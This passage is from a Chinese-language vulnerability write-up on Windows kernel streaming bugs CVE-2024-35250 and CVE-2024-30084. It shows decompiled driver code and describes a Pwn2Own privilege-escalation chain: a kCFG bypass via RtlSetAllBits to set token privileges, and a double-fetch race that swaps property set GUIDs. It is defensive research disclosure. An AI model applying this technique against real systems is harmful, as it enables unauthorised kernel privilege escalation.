<span class="hljs-comment">//------[3]</span><br>  &#123;<br>   <span class="hljs-comment">//Convert 32-bit requests to 64-bit requests</span><br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( CurrentStackLocation-&gt;Parameters.DeviceIoControl.IoControlCode == IOCTL_KS_PROPERTY )<br>  &#123;<br>    <span class="hljs-keyword">return</span> CKSThunkDevice::CheckIrpForStackAdjustmentNative((__int64)a1, irp, v11, a4) <span class="hljs-comment">//-----[4];</span><br>  &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>ksthunk 会先判断是否是 WoW64 的进程的请求，如果是就会将原本 32 位的请求转换成 64 位的[3]，如果原本就是 64 位则会呼叫<code>CKSThunkDevice::CheckIrpForStackAdjustmentNative</code>[4]往下传递。 </p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs zephir"> __int64 __fastcall CKSThunkDevice::DispatchIoctl(CKernelFilterDevice *a1, IRP *irp, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a3, NTSTATUS *a4)<br>&#123;<br> ...<br>  <span class="hljs-keyword">if</span> ( IoIs32bitProcess(irp) &amp;&amp; irp-&gt;RequestorMode ) <span class="hljs-comment">//------[3]</span><br>  &#123;<br>   <span class="hljs-comment">//Convert 32-bit requests to 64-bit requests</span><br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( CurrentStackLocation-&gt;Parameters.DeviceIoControl.IoControlCode == IOCTL_KS_PROPERTY )<br>  &#123;<br>    <span class="hljs-keyword">return</span> CKSThunkDevice::CheckIrpForStackAdjustmentNative((__int64)a1, irp, v11, a4) <span class="hljs-comment">//-----[4];</span><br>  &#125;<br>&#125; __int64 __fastcall CKSThunkDevice::CheckIrpForStackAdjustmentNative(__int64 a1, struct _IRP *irp, __int64 a3, <span class="hljs-keyword">int</span> *a4)<br>&#123;<br> ...<br>    <span class="hljs-keyword">if</span> ( *(_OWORD *)&amp;Type3InputBuffer-&gt;Set == *(_OWORD *)&amp;KSPROPSETID_DrmAudioStream<br>        &amp;&amp;!type3inputbuf.Id<br>        &amp;&amp; (type3inputbuf.Flags &amp; <span class="hljs-number">2</span>)!= <span class="hljs-number">0</span> )   <span class="hljs-comment">//-----[5] </span><br>    &#123;<br>        <span class="hljs-keyword">if</span> ( irp-&gt;RequestorMode ) <span class="hljs-comment">//-------[6]</span><br>        &#123;<br>        v14 = <span class="hljs-number">0xC0000010</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>        UserBuffer = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)irp-&gt;UserBuffer;<br>       ...<br>        v14 = (*(__int64 (__fastcall **)(_QWORD, _QWORD, __int64 *))(Type3InputBuffer + <span class="hljs-number">0x38</span>))(<span class="hljs-comment">// call Type3InputBuffer+0x38</span><br>                *UserBuffer,<br>                <span class="hljs-number">0</span>LL,<br>                v19); <span class="hljs-comment">//------------[7]</span><br>        &#125;<br>    &#125; <br>&#125; <br></code></pre></td></tr></table></figure><p>我们在[5]看到，如果我们给定的属性集是<a href="https://learn.microsoft.com/mt-mt/windows-hardware/drivers/audio/kspropsetid-drmaudiostream">KSPROPSETID_DrmAudioStream</a>，就有特别的处理。而在[6]时，会先去判断 Irp-&gt;RequestorMode 是否为 KernelMode(0)，如果从 UserMode(1)呼叫的 IOCTL 就会直接返回错误，但如果我们使用前面所说的<code>KSPROPERTY_TYPE_UNSERIALIZESET</code>来呼叫 IOCTL，并指定<code>KSPROPSETID_DrmAudioStream</code>这个属性，那么这里[6]就会是 KerenlMode(0)。接下就会在[7]直接使用使用者所传入的内容作为函数呼叫，甚至第一个参数是可控的，实际写 PoC 后，验证了我们的结果。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/25.png"> 这边可能会有人有疑惑，什么设备或是情况下会有<code>KSPROPSETID_DrmAudioStream</code>？实际上来说音频设备大多情况下都会有，主要是用来设置 DRM 相关内容用的。 </p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>在有了任意呼叫之后，要达成提权就不是太大的问题，虽然会遇到 kCFG、kASLR、SMEP 等等保护，但在 Medium IL 下唯一比较需要处理的就只有 kCFG。 </p><ul><li><strong>kCFG</strong> </li><li>kASLR    <ul><li>NtQuerySystemInformation</li></ul></li><li>SMEP    <ul><li><ul><li>重用内核代码 *   …</li></ul></li></ul></li></ul><h4 id="绕过-kCFG"><a href="#绕过-kCFG" class="headerlink" title="绕过 kCFG"></a>绕过 kCFG</h4><p>那我们目标很简单，就是从合法的函数做出任意写的基本条件，而之后就可以利用常见的方法<a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/how-kernel-exploits-abuse-tokens-for-privilege-escalation#id-1.-replacing-tokens-for-privilege-escalation">用系统令牌取代当前的进程令牌</a>或是<a href="https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf">滥用牌权限</a></p><p>去做到提权。 直觉地会直接去找看看，kCFG 中合法的函数名称有 set 的函数，比较可能是可以写入的。我们这里是直接拿 ntoskrnl.exe 中导出函数去寻找看看是否有合法的函数，这些大多情况下都是合法的。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/26.png"> 而很快的我们就找到了<a href="https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlsetallbits">RtlSetAllBits</a>。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/27.png"> 它是个非常好用的 gadget 而且是 kCFG 中合法的函数，另外也只要控制一个参数<code>_RTL_BITMAP</code>。 </p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">struct _RTL_BITMAP<br>&#123;<br>    ULONG SizeOfBitMap<span class="hljs-comment">;                                               </span><br>    ULONG* Buffer<span class="hljs-comment">;                                                   </span><br>&#125;<span class="hljs-comment">; </span><br></code></pre></td></tr></table></figure><p>我们可将 Buffer 指定到任意位置并指定大小，就可以将一段范围的 bits 全部设置起来，到这边就差不多结束了，只要将<code>Token-&gt;Privilege</code>全部设置起来，就可以利用 Abuse Privilege 方法来做到提权了。 然而…在 Pwn2Own 比赛前，我们在 Hyper-V 上安装一个全新 Windows 11 23H2 VM 测试 Exploit，结果失败了。而且是在开启设备阶段就失败。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/28.png"> 经过调查后发现到 Hyper-V 在预设情况下并不会有音频设备，造成 exploit 会失败。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/29.png"> 在 Hyper-V 中，预设情况下只会有 MSKSSRV，然而 MSKSSRV 也没有 KSPROPSETID_DrmAudioStream 这个属性，使得我们无法成功利用这个漏洞达成提权，因此我们必须找其他方式触发或者找新的漏洞，此时我们决定重新审查一遍整个流程，看看是否还有其他可能利用的地方。 </p><h3 id="CVE-2024-30084"><a href="#CVE-2024-30084" class="headerlink" title="CVE-2024-30084"></a>CVE-2024-30084</h3><p>重新审视后，发现到 IOCTL_KS_PROPERTY 是使用<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-neither-buffered-nor-direct-i-o">Neither I&#x2F;O</a>来传递资料的，也就是说会直接拿使用者的输入缓冲区来做资料上的处理，一般来说不太建议使用这个方法，很常出现 Double Fetch 的问题。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/30.png"> 我们可从上图中 KspPropertyHandler 看到，在使用者呼叫 IOCTL 之后，会直接将 Type3InputBuffer 复制到新分配出来的缓冲区中，其中会存有<a href="https://learn.microsoft.com/zh-tw/windows-hardware/drivers/stream/ksproperty-structure">KSPROPERTY</a>结构，接下会用这结构中的 GUID 来查询属性是否有在该设备所支持的属性中，若存在才会继续往下呼叫<code>UnserializePropertySet</code>。 这边我们再回头看一眼<code>UnserializePropertySet</code>。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/31.png"> 我们可以发现到，<strong>它又再次从 Type3InputBuffer 复制使用者所提供的资料</strong>做为新的 IOCTL 的输入，很明显的这边就存在了一个 Double Fetch 的漏洞，因此我们将整个利用流程改成下的样子。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/32.png"> 我们一开始发送 IOCTL_KS_PROPERTY 时，就会先以 MSKSSRV 既有的属性<code>KSPROPSETID_Service</code>来做后续操作，而在图中第 6 步时，会先复制一份属性的 GUID 到内核中，而后再用这个属性 GUID 去查询是否有在该 KS 对象的支持清单中，而这边因为 MSKSSRV 有支持，就会往下呼叫<code>UnserializePropertySet</code>。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/33.png"> 在呼叫 UnserializePropertySet 后，因为有 Double Fetch 的漏洞，让我们可以在检查后到使用之间，将<code>KSPROPSETID_Service</code>换成<code>KSPROPSETID_DrmAudioStream</code>，而接下就可以让 ks 使用<code>KSPROPSETID_DrmAudioStream</code>作为请求来发送 IOCTL，从而触发前述了 CVE-2024-35250 逻辑漏洞，使这个漏洞不论在什么环境下都可以使用。 最终我们成功在 Pwn2Own Vancouver 2024 中，成功攻下 Micorsoft Windows 11。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/34.png"> 在 Pwn2Own 结束后，经过我们调查，发现到这个漏洞从 Windows 7 就存在了，至少存在将近 20 年，而且利用上非常稳定，有着百分之百的成功率，强烈建议大家尽快更新至最新版本。    </p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/">Critically Close to Zero-Day: Exploiting Microsoft Kernel Streaming Service</a></li><li>[Windows Kernel Security - A Deep Dive into Two Exploits Demonstrated at Pwn2Own](<a href="https://conference.hitb.org/hitbsecconf2023hkt/materials/D2T1">https://conference.hitb.org/hitbsecconf2023hkt/materials/D2T1</a> - Windows Kernel Security - A Deep Dive into Two Exploits Demonstrated at Pwn2Own - Thomas Imbert.pdf)</li><li><a href="https://big5-sec.github.io/posts/CVE-2023-29360-analysis/">CVE-2023-29360 Analysis</a></li><li><a href="https://securityintelligence.com/x-force/little-bug-that-could/">Racing Round and Round: The Little Bug That Could</a></li><li><a href="https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html">Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager</a></li><li><a href="https://googleprojectzero.blogspot.com/2021/01/hunting-for-bugs-in-windows-mini-filter.html">Hunting for Bugs in Windows Mini-Filter Drivers</a></li><li><a href="https://msrc.microsoft.com/blog/2019/03/local-privilege-escalation-via-the-windows-i-o-manager-a-variant-finding-collaboration/">Local Privilege Escalation via the Windows I&#x2F;O Manager: A Variant Finding &amp; Collaboration</a>。</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞分析与挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内核漏洞</tag>
      
      <tag>主机安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
